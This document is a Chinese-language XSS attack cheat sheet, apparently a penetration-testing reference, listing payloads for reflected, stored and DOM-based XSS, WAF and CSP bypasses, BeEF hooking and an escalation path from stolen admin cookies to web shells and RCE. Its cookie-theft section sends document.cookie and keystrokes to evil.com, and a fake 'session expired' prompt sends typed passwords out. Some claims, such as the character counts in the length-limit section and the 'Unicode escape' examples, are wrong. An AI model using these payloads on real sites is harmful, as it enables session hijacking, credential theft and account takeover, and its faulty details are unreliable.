# XSS 跨站脚本实战参考

> 分类: 检测 → 反射型 → 存储型 → DOM型 → Cookie窃取 → BeEF → WAF绕过 → CSP绕过

---

## 1. 快速检测

### 1.1 检测 Payload

```html
<!-- 基础弹窗 (最常用) -->
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- 短版 -->
"><script>alert(1)</script>
'><script>alert(1)</script>

<!-- 无script标签 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- 最短 -->
<svg/onload=alert(1)>
```

### 1.2 按输出点选择 Payload

```
输入在 HTML标签之间  → <script>alert(1)</script>
输入在 <input> 属性中 → "><script>alert(1)</script>
输入在 <script> JS中  → '</script><script>alert(1)</script> 或 -alert(1)-
输入在 <a href> 中     → javascript:alert(1)
输入在 URL 参数中      → 闭合当前属性或标签
输入在 CSS 中          → expression/url/@import 等 CSS注入
输入在 JSON 响应中     → '</script>闭合 + HTML注入
输入在 Error Page      → %0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
```

---

## 2. 反射型 XSS

### 2.1 常见注入点

```
搜索框:       ?q=<script>alert(1)</script>
错误消息:     ?error=<script>alert(1)</script>
重定向参数:   ?redirect=javascript:alert(1)
回调参数:     ?callback=<script>alert(1)</script>
模板变量:     ?name={{7*7}}
```

### 2.2 绕过基础过滤

```html
<!-- 1. 大小写混合 -->
<ScRiPt>alert(1)</sCrIpT>

<!-- 2. 双写绕过 -->
<scr<script>ipt>alert(1)</script>

<!-- 3. 替换标签 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>

<!-- 4. 事件处理器 -->
<svg/onload=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)></video>

<!-- 5. 不带括号 (location=name) -->
<script>throw onerror=eval,0,';alert\x281\x29'</script>
```

---

## 3. 存储型 XSS

### 3.1 典型注入位置

```
留言板/评论区:   <p>你的评论</p> → <p><script>alert(1)</script></p>
用户资料页:     用户名/签名/头像URL → 
富文本编辑器:   绕过XSS过滤器 (DOMPurify等)
文件上传:       上传HTML/SVG文件
```

### 3.2 绕过长度限制

```html
<!-- 多个注入点拼接 -->
<!-- 评论1: --> <script>a="
<!-- 评论2: --> alert(1)
<!-- 评论3: --> "</script>

<!-- 组合后: --> <script>a="alert(1)"</script> (错误) 

<!-- 更好: JS变量赋值利用 -->
<!-- name字段(限10字): --> ";a=1;//
<!-- bio字段(限50字): --> if(a){new Image().src='http://evil.com/?c='+document.cookie}
```

---

## 4. DOM 型 XSS

### 4.1 常见 Sink

```javascript
// Source → Sink 模式
document.write(location.hash)         // #<img src=x onerror=alert(1)>
element.innerHTML = location.search   // ?x=<img src=x onerror=alert(1)>
eval(location.hash.slice(1))          // #alert(1)
setTimeout(location.hash.slice(1))    // #alert(1)

// jQuery
$('#div').html(location.hash)         // #<img src=x onerror=alert(1)>
$(location.hash)                      // jQuery selector injection
$.getScript(location.hash.slice(1))

// AngularJS
{{constructor.constructor('alert(1)')()}}
```

### 4.2 DOM XSS 检测

```bash
# 用DOM Invader (Burp内置) 或手动检查:
# 1. 找 Source: location.* / document.referrer / window.name / postMessage
# 2. 找 Sink: innerHTML / document.write / eval / location.href
# 3. 追踪 Source→Sink 路径
```

---

## 5. Cookie/凭据窃取

### 5.1 Cookie窃取 Payload

```html
<!-- HTTP -->
<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>
<script>fetch('http://evil.com/steal?c='+document.cookie)</script>

<!-- 无CORS用 -->
<script>document.location='http://evil.com/steal?c='+document.cookie</script>

<!-- 密钥记录 -->
<script>
document.onkeypress=function(e){
  new Image().src='http://evil.com/k?k='+e.key
}
</script>
```

### 5.2 钓鱼弹窗

```html
<!-- 伪造登录框 -->
<script>
var p=prompt('Session expired, re-enter password:');
new Image().src='http://evil.com/p?p='+p;
</script>
```

---

## 6. BeEF 用法

```bash
# Hook js 注入:
<script src="http://<beef-server>:3000/hook.js"></script>

# BeEF 命令:
# beef-xss  # 启动
# → 管理界面: http://127.0.0.1:3000/ui/panel

# 利用模块:
# - 浏览器指纹
# - 内网扫描 (port scan)
# - 摄像头/麦克风 (需权限)
# - 社会工程弹窗
# - 配合Metasploit
```

---

## 7. WAF/过滤器绕过

### 7.1 编码绕过

```html
<!-- HTML实体 -->
&lt;script&gt;alert(1)&lt;/script&gt;  → 在某些位置仍生效

<!-- URL编码 -->
%3Cscript%3Ealert(1)%3C%2Fscript%3E

<!-- Unicode编码 (JS字符串) -->
<script>alert(1)</script>

<!-- Base64 (eval) -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- JSFuck (仅6个字符写JS) -->
<script>([][(![]+[])[+[]]+...])</script>
```

### 7.2 特殊标签/协议

```html
<!-- data: URI -->
<object data="data:text/html,<script>alert(1)</script>">

<!-- vbscript: (IE only) -->
<a href="vbscript:msgbox(1)">click</a>

<!-- 无交互 -->
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>

<!-- 使用HTML5新标签 -->
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<ruby><rt onfinish=alert(1)>

<!-- Mutation XSS (innerHTML) -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### 7.3 表情包/emoji 绕过

```
# 部分WAF对含emoji或特殊Unicode的payload处理异常
<img src=x onerror=alert😀(1)>  → 部分过滤失效
```

---

## 8. CSP (Content-Security-Policy) 绕过

### 8.1 检查CSP

```bash
curl -I https://target.com | grep -i content-security-policy
# 或浏览器 F12 → Console → 看错误消息
```

### 8.2 常见CSP绕过

```bash
# 1. unsafe-inline → script-src 'unsafe-inline' → 直接<script>
# 2. unsafe-eval → script-src 'unsafe-eval' → eval()可用
# 3. 通配符域名 → *.googleapis.com → 如果托管了Angular JSONP等
# 4. data: → img-src data: → <img src="data:text/html,<script>alert(1)</script>">
# 5. 白名单CDN → cdnjs/ajax.googleapis.com → JSONP端点/angular.js

# JSONP 劫持 (script-src 白名单了可JSONP的域名)
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js?callback=alert(1)"></script>

# 利用 Angular 库 (angularjs.org 在白名单)
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<div ng-app ng-csp>
  <div ng-click="$event.view.alert(1)">Click</div>
</div>
```

---

## 9. XSS 漏洞链 — 到 RCE

```
存储型 XSS → 管理员Cookie → 登入后台
→ 后台有文件上传 → WebShell
→ 后台有模板编辑 → 写PHP代码 → RCE
→ 后台有数据库管理 → SQL命令执行 → RCE
→ 后台有系统命令执行 → 直接RCE

反射型 XSS → 钓鱼链接 → 管理员触发 → 同存储型利用链
```

---

## 10. 实战XSS绕过进阶技巧

> 来源: skill-evolver 实战知识沉淀
> ⚠️ 以下技巧均需你在Burp中验证后确认

### 10.1 零交互标签事件大全

当 `<script>` 被完全过滤时, HTML 有 100+ 标签可触发事件:

```html
<!-- 零交互自动触发 (首选) -->
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>

<!-- 页面加载自动触发 -->
<body onload=alert(1)>
<svg onload=alert(1)>
<iframe onload=alert(1)>

<!-- 鼠标移动触发 (适合评论框/页面任意位置) -->
<body onmousemove=alert(1)>
<div onmouseover=alert(1)>
<div onmouseenter=alert(1)>

<!-- 资源加载失败触发 (不需要用户交互) -->
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<img src=x onerror=alert(1)>

<!-- iframe data协议 -->
<iframe src="data:text/html,<script>alert(0)</script>">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<!-- 其他可用标签 -->
<plaintext/onmouseover=alert(1)>
<marquee onstart=alert(1)>
<command oncut=alert(1)>
```

> ⚠️ 注意: Chrome 86+ 一个页面只能有一个 `autofocus`，如果页面已有则失效。这时换 `ontoggle` 或 `onmousemove`。

### 10.2 空格绕过 (WAF漏报率最高)

HTML 不要求属性间必须用空格分隔:

```html
<!-- 用斜杠 / 分隔 (最常用) -->
<img/src=x/onerror=alert(1)>

<!-- 用空白字符 (Tab/换行) -->
<img%09src=x%09onerror=alert(1)>   <!-- Tab -->
<img%0Asrc=x%0Aonerror=alert(1)>   <!-- 换行 -->
<img%0Dsrc=x%0Donerror=alert(1)>   <!-- 回车 -->

<!-- 用HTML注释分隔 (绕过率70%+) -->
<img<!-- -->src=x<!-- -->onerror=alert(1)>
```

> 原理: HTML 解析器把任何空白字符都当作分隔符, 而多数 WAF 正则只匹配空格。

### 10.3 引号绕过

```html
<!-- 完全不用引号 (属性值无特殊字符时) -->
<img src=x onerror=alert(1)>

<!-- 反引号 (90% WAF漏了) -->
<img src=x onerror=/xss/``>
<img src=x onerror=alert(`xss`)>

<!-- HTML实体编码 -->
<img src=x onerror=alert&#40;1&#41;>

<!-- 无引号 + 斜杠组合 -->
<button/onclick=alert(1)>xss</button>
<a href=javascript:alert(1)>1</a>
```

### 10.4 关键字过滤绕过

```html
<!-- 字符串拼接 -->
<img src=x onerror=eval('a'+'lert(1)')>
<img src=x onerror=window['ale'+'rt'](1)>

<!-- HTML实体编码 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Unicode转义 (JS字符串内) -->
<img src=x onerror=alert(1)>

<!-- 双写绕过 (对付简单替换) -->
<scr<script>ipt>alert(1)</script>
<img src=x ononerror=alert(1)>
```

### 10.5 括号过滤绕过 (模板字符串)

当 `()` 被过滤时用 ES6 模板字符串:

```html
<!-- 模板字符串调用函数 - 不需要括号 -->
<img src=x onerror=alert`xss`>
<img src=x onerror=console.log`xss`>

<!-- 配合 with 语句 -->
<img src=x onerror=with(window)alert`xss`>
```

> 这个技巧绕过率极高, 多数WAF的规则未考虑。

### 10.6 SVG 标签高级技巧

SVG 是 XML 格式, 解析规则和 HTML 不同, WAF 对 SVG 解析有严重缺陷:

```html
<!-- 最基础 -->
<svg onload=alert(1)>
"><svg/onload=alert(1)>//

<!-- SVG + xlink 伪协议 -->
<svg><a/xlink:href=javascript:alert(1)>xss</a>

<!-- SVG + animate (自动触发, 不需要onload) -->
<svg><animate onbegin=alert(1) attributeName=dur dur=1s>

<!-- SVG 外部JS引用 -->
<svg/onload=import(function(){alert(1)})>
```

### 10.7 伪协议绕过

```html
<!-- 大小写混淆 -->
<a href="JavaScriPt:alert(1)">test</a>

<!-- 插入空白字符 -->
<a href="java%09script:alert(1)">test</a>
<a href="java%0Ascript:alert(1)">test</a>

<!-- data协议 (终极杀招) -->
<iframe src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### 10.8 长度限制绕过

```html
<!-- 14个字符, 自动触发 -->
<input autofocus onfocus=alert(1)>

<!-- 13个字符 -->
<svg onload=alert(1)>

<!-- 12个字符 -->
<iframe onload=alert(1)>
```

### 10.9 反射点在不同位置的闭合技巧

```html
<!-- 反射点在标签属性内 (最常见) -->
<!-- 原代码: <input type="text" value="你的输入"> -->
<!-- 闭合属性: -->
" autofocus onfocus=alert(1) x="

<!-- 反射点在JS代码中 (最爽的场景) -->
<!-- 原代码: var username = "你的输入"; -->
<!-- 闭合引号: -->
"; alert(1); //
<!-- 闭合函数调用: -->
'); alert(1); //

<!-- 反射点在JS对象中: -->
'}); alert(1); //
```

